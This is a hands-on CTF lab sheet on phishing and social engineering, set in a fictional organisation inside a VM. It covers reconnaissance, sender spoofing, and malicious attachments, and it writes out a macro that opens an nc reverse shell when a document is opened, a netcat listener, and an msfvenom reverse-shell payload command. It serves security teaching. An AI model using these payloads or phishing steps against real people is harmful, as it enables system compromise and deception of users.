---
title: "Human Factors and Social Engineering: Phishing"
author: ["Z. Cliffe Schreuders", "Tom Shaw"]
license: "CC BY-SA 4.0"
description: "Learn about human factors in cybersecurity through hands-on phishing simulation. Practice social engineering techniques, email spoofing, and creating malicious attachments to understand how attackers exploit human psychology."
overview: |
  Humans play a crucial role in the cyber security of systems and information. Many attacks target users and their mental models of cyber security systems and risk. For example, if an attacker can trick a user into performing tasks for them, the attacker can achieve their goals and gain access that they are not authorised to. Human behavior often serves as both the first line of defense and the weakest link. This lab delves into the critical role humans play in safeguarding systems and information. It highlights the fact that even the most robust technical defenses can be compromised due to human error and deception. This lab primarily focuses on a pervasive cyber threat - phishing attacks. Phishing, an artful manipulation of human psychology, lures individuals into compromising security by tricking them into revealing sensitive information, clicking malicious links, or installing malware. Through this hands-on exercise, you will gain insights into how attackers exploit human vulnerabilities, learn the tactics used to craft convincing phishing emails, and explore techniques to create malicious attachments that can compromise a user's system.

  In this lab, you will embark on a simulated cybersecurity mission within a fictitious organization. Your objective is to browse the organization's website to gather information on employees, email addresses, and their potential interests. You will then employ the tactics of engagement by sending targeted phishing emails to these individuals, using techniques such as spoofing emails, creating malicious attachments (executable programs, LibreOffice documents with macros), and more. As your victims respond to your emails, they will reveal why they trust or distrust your messages, providing invaluable feedback. The ultimate goal is to persuade these users to open the malicious attachments, granting you remote access to their systems. Your mission culminates in accessing the coveted "flag" files hidden in each victim's home directory, which you will submit as proof of your success. This lab offers a unique opportunity to understand how cybersecurity threats exploit human psychology, providing a practical foundation to enhance cyber awareness and strengthen defenses against these deceptive tactics.
tags: ["phishing", "social-engineering", "email-security", "human-factors", "malware", "macros"]
categories: ["cyber_security_landscape"]
lab_sheet_url: "https://docs.google.com/document/d/1Yb28GYRLD0Ihnb5oeFp-TGurhb8BZfm_qFbSSrGEknI/edit?usp=sharing"
type: ["ctf-lab", "lab-sheet"]
difficulty: "easy"
cybok:
  - ka: "HF"
    topic: "Human Error"
    keywords: ["latent usability failures in systems-of-systems"]
  - ka: "AB"
    topic: "Attacks"
    keywords: ["SOCIAL ENGINEERING", "MALICIOUS ACTIVITIES BY MALICIOUS ATTACHMENTS"]
  - ka: "MAT"
    topic: "Attacks and exploitation"
    keywords: ["EXPLOITATION FRAMEWORKS", "MALCODE/MALWARE - SOCIAL ENGINEERING - BAITING", "MALCODE/MALWARE - SOCIAL ENGINEERING - PRETEXTING", "MALCODE/MALWARE - VIRUSES - MACRO VIRUSES", "MALCODE/MALWARE - SPAM", "MALCODE/MALWARE - SPOOFING"]
  - ka: "WAM"
    topic: "Client-Side Vulnerabilities and Mitigations"
    keywords: ["E-MAIL - PHISHING", "E-MAIL - SPOOFING"]
---

# Introduction to Human Behaviour and Cyber Security

Humans play a crucial role in the cyber security of systems and information. Many attacks target users and their mental models of cyber security systems and risk. For example, if an attacker can trick a user into performing tasks for them, the attacker can achieve their goals and gain access that they are not authorised to. 

It is often said that “the user is the weakest link in security”, because **human error** can have as much impact as a technical vulnerability, and it is often possible regardless of how strong technical defences are. 

As a consequence, cyber security awareness training is an important part of an organisation’s cyber security programme. It is also important that the security that is put in place needs to be usable/understandable and acceptable to users.

## Introduction to Phishing {#introduction-to-phishing}

One way that users are attacked is through phishing emails. A phishing email attack is an email that tricks the user into performing actions such as revealing sensitive information, clicking links that trigger technical web attacks, or installing malware. This lab focuses on the latter, malicious code sent via email. If an employee opens a malicious attachment, such as a document with macros or an executable program, then an attacker can take direct control of that user’s computer.

## Preparation {#preparation}

Access the challenge via Hacktivity.

We have automated most of the setup required for the lab, except you need to setup Thunderbird email client manually, and disable the proxy for Firefox.

==VM: On Kali Linux==

==action: Login with user: kali, password: kali==.

==action: Start by opening Thunderbird (Applications → Usual Applications → Internet → Thunderbird)==.

![][image-2]

Thunderbird may take a minute to start.

==action: Enter these details:==

* Full name: Guest  
* Email address: guest@accountingnow.com  
* Password: guestpassword

![][image-3]

![][image-4]

==action: Click "Continue" and "Done"==.

> Warning: **If prompted** with a warning, accept the lack of encryption between the server and the client:

![][image-5]

==action: "I understand the risks", "Confirm" and "Confirm security exception"==.

> Note: In real life, you should not use email that has no encryption between the server and client. We will explore email security further in a future topic.

![][image-6]

==action: Click "Confirm Security Exception"==.

==action: Click "Finish"==.

==action: Open Firefox (Applications → Usual Applications → Internet → Firefox)==.

Firefox may take a minute to start.

==action: Disable the proxy in Firefox (Menu → Preferences)==:

![][image-7]

==action: Scroll down to the bottom of the page: Network Settings → "Settings"==

![][image-8]

![][image-9]

==action: "No proxy"==

==action: Click "OK."==

## The aim and tasks in this lab {#the-aim-and-tasks-in-this-lab}

This lab provides a simulated organisation scenario, where you will:

* Browse the organisation’s website to identify employees, email addresses, potential friendships and interests.  
* Send emails to them to trick them into running attachments, by crafting a convincing email by including keywords, names, spoofed email addresses, and content.  
* Send them malicious attachments: executable programs, libreoffice documents.  
* When you get the victims to open these attachments, you can gain remote access to their s\`stem, and get a flag for each user you trick this way.

The aim is to get access to the “flag” file from each victim’s home directory, which contains flags for you to submit to Hacktivity.

## Reconnaissance: browse the website {#reconnaissance:-browse-the-website}

==VM: From within your VM==, ==action: Browse to our target organisation: http://accountingnow.com== (this is a fictional organisation that exists in your VM, don't visit the actual Internet site with this URL\!)

![][image-10]

==action: Look through all the pages on this website and document all the employee's names and email addresses that you can find==.

## Engagement: send phishing emails {#engagement:-send-phishing-emails}

==action: From your list of email addresses, try sending an email to one of them from within Thunderbird: click "Write"==.

![][image-11]

==action: Type a message and click "Send"==.

==action: Check your email to see what reply you get (Click "Get Messages", wait and check again if you don't have a reply yet)==. The reply may look something like the following:

```
I'm not accepting this email because:

* I don't trust the sender

* The message doesn't include the sender's name

* It's not addressed to me

* It's unrelated to me

----------

Hello there!
```

In this simulation your victims will reply and tell you why they are not choosing to trust the email (unlike in real life\!). Once they trust your email they won't reply, they will instead open any attachments they trust.

> Hint: Each victim will only open certain types of attachments, or none at all.

> Flag: Each victim has a flag file in their home directory, containing the flag you need to access to succeed at the challenge.

> Tip: You can write a similar email by viewing your sent folder, and right click → "Edit As New Message".

# Hint: Spoofing emails {#hint-spoofing-emails}

You can change the email address that the email is sent "from" – without knowing any passwords for the accounts. This is due to a fundamental security issue in the way emails are authenticated. Not all outgoing email servers require authentication that matches the email address on the email. There are protections in place that means that emails that are sent from untrusted email servers may not be accepted; however, further discussion is outside the scope of this exercise.

==action: To change your sender email address, click the drop-down selector next to your From address, and click "Customize From Address"==.

![][image-12]

> Note: In this simulation you will still receive reply messages, unlike real life where replies would be sent to the spoofed email address.

# Hint: Creating malicious attachments {#hint-creating-malicious-attachments}

> Hint: The types of malicious attachments that you should try sending includes:

* Executable programs  
* LibreOffice Writer (word processor .odt files) with Macros  
* LibreOffice Calc (spreadsheet .ods files) with Macros

> Hint: Think about the kinds of jobs people have and which kinds of documents they are most likely to receive and open – for example, is someone working in finance most likely to accept a program or a spreadsheet?

> Tip: If you want an additional challenge, skip these hints, and send your own payloads of choice.

## Hint: creating malicious macros that execute when the document is opened {#hint-creating-malicious-macros-that-execute-when-the-document-is-opened}

Office documents, such as Microsoft Word or Excel, or LibreOffice Writer or Calc, can have macros saved within them. Macros are programming scripts (often written in a Visual Basic based programming language) that can be used to automate calculations and modifications to documents, but can also access external resources and execute operating system commands. 

Due to the damage they can do, in recent years by default a document with Macros will warn the user against running untrusted macros. However, in this scenario we are dealing with users who say "ok" to everything.

> Tip: If you want an additional challenge, skip this hint, and send your own payload of choice.

==action: You can create a document with a macro:==

==action: Open LibreOffice Writer (Applications → Usual Applications → Office → LibreOffice Writer)==.

==action: Click menu Tools → Macros → Organise Macros → Basic…==

==action: Click Untitled 1 (or the name of the current file)==

==action: Click "New"==

==action: Name the macro anything, such as "macro"==

==action: Enter the source code for your Macro==. Here is an example of a macro that runs a shell command (in this case creating a file "thisisatest" in the current working directory of the program:

```vb
Sub Main
  Shell("/bin/touch", vbNormalFocus, "thisisatest")
End Sub
```

==action: After you have entered some code, to get the macro to run when the document is opened:==

==action: Minimise the Macro code window==. 

==action: Click the document's menu Tools → Customise → Events (tab)==

==action: Select "Open Document"==

==action: Click "Macro…"==

> Tip: If you cannot see your macro, you may have opened the 'Customise' pane via the Macro window's toolbar rather than the Document window's toolbar.

==action: Expand the "+" next to Untitled 1, Standard, macro, and select the Main on the right==.

![][image-13]

==action: Type some content into your document and save it as an .odt file==.

Now when you open the document up it will try to execute it (if your victim's macro security settings are set low, and they agree to run it).

==action: Try open the document that you just created locally on the Kali VM in LibreOffice Writer==.

![][image-14]

You will see a warning at the top of the page suggesting that the macro will not run. This is due to the fact the Kali VM has a restrictive macro security setting, but this is not always the case. 

==action: In order to simulate the attack locally you should downgrade your macro security settings:==

==action: Click the document's Tools → Options==

==action: Select LibreOffice → Security from the side panel, then click Macro Security…== 

![][image-15]

==action: Change the Security Level to Low==

It is worth noting that the Medium level requires confirmation from the user, but still allows them to run macros if they accept the risks. When the user accepts the warning, macros will execute. 

Some word processors are configured this way by default and it is common for less technically proficient end-users to click through security warnings without understanding the consequences. 

==action: You can create a macro that creates a simple reverse shell using nc:==

```vb
Sub Main
  Shell("/bin/nc", vbNormalFocus, "-e /bin/sh ==edit:KALI_IP_ADDRESS== 8080")
End Sub
```

Where ==edit:KALI_IP_ADDRESS== is the IP address reported from:

```bash
hostname -I
```

==action: On Kali, start listening for connections, before the document is opened:== 

```bash
nc -lvvp 8080
```

When your victim opens the document, the reverse shell will be triggered connecting back to your Kali system. If you have started the listener, you will be greeted with shell access to the victim.

> Tip: It can take a minute or two for LibreOffice to launch on the victim, so be patient.

## Hint: creating malicious executable programs (malware payload) {#hint:-creating-malicious-executable-programs-(malware-payload)}

==VM: On Kali== ==action: start a netcat listener, and leave this running; your victim will connect back to this:==

```bash
nc -lvvp 4444
```

Where ==edit:KALI_IP_ADDRESS== is the IP address reported from:

```bash
hostname -I
```

==VM: On Kali== ==action: create a reverse tcp payload, by using metasploit:==

```bash
msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST==edit:KALI_IP_ADDRESS== LPORT=4444 -f elf -o malware
```

You can send the malware file as a malicious attachment. When a victim opens it, it will connect back to your Kali system with a connection to run shell commands.

## Hint: accessing the flag files {#hint:-accessing-the-flag-files}

> Flag: A flag file can be found in each victim's home directory. Read the flag, by gaining shell access to their system, then running commands.

Once you have a shell connection to the victim you can start running commands such as:

==action: List all files, showing details:==

```bash
ls -la
```

==action: Read the contents of a file named flag in the current directory:==

```bash
cat flag
```

> Flag: Submit the flags to Hacktivity!

## Conclusion {#conclusion}

At this point you have:

* Seen how information from public sources, such as websites can inform spear phishing attempts

* Spoofed emails, and crafted messages to trick users

* Experienced adversarial phishing behaviours – using macros and executable payloads to attack users

Well done\!

Note that these example attacks rely on poor user behaviour rather than vulnerable systems. Hopefully these attacks wouldn’t work against well informed users; however, it helps to illustrate how spear phishing attacks are conducted, and the danger of poor “cyber hygiene”.

It is important to ensure users are cyber security aware enough not to fall for these kinds of tricks.

[image-1]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-1.png
[image-2]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-2.png
[image-3]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-3.png
[image-4]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-4.png
[image-5]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-5.png
[image-6]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-6.png
[image-7]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-7.png
[image-8]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-8.png
[image-9]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-9.png
[image-10]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-10.png
[image-11]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-11.png
[image-12]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-12.png
[image-13]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-13.png
[image-14]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-14.png
[image-15]: {{ site.baseurl }}/assets/images/cyber_security_landscape/3_phishing/image-15.png
